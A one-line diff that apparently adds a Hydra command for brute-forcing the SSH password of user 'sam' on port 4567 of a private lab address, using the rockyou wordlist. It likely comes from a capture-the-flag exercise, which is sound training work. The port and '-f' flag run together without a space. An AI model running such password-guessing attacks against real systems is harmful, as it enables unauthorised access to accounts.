@@ -1,0 +1,1 @@
+hydra -l sam -P /usr/share/wordlists/rockyou.txt -o hydra_found.txt -s 4567-f -vV 10.10.58.139 ssh
